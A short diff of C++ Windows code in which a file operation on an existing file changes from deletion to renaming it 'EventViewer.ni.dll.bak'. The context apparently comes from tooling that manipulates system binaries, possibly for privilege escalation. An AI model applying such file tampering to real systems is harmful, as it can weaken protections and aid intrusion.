@@ -377,7 +377,7 @@ int main()
 
 	delete[] currentDirectory;
 
-	result = fileOperation->DeleteItem(existingFile, nullptr);
+	result = fileOperation->RenameItem(existingFile, L"EventViewer.ni.dll.bak", nullptr);
 	if (FAILED(result))
 	{
 		targetFile->Release();
